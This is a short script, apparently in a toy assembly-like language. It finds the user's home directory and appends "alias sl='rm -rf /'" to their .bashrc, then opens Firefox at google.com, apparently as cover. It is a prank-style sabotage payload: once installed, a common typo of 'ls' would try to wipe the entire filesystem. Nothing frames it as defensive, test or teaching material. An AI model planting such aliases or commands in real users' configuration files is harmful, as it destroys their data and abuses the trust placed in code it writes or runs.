loads "HOME"
env re

loadr r1 re
loads "/.bashrc"
append r1 re
print re

open r1 re
loads "alias sl='rm -rf /'"
write r1 re 
close r1 

loads "firefox https://www.google.com"
system re

exit